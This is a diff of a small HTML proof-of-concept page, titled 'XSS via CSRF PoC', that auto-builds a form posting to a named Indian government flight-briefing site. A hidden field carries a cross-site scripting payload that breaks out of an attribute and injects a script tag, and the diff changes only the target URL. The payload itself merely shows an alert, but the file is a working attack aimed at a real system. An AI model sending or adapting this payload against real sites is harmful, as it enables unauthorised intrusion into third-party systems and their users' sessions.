@@ -5,7 +5,7 @@
 </head>
 <body>
       <h3>XSS via CSRF PoC by t0m1irv4n</h3>
-      <form action="https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/showopmetquery.php" method="post">
+      <form action="https://olbs.amssdelhi.gov.in/nsweb/FlightBriefing/#showMetars" method="post">
       <input type="hidden" name="icaos" value="HOLA&quot;>><</p><script>alert(`XSS`)</script>" />
     <input type="hidden" name="type" value="taf" />
           <input type="submit" value="Submit request" />
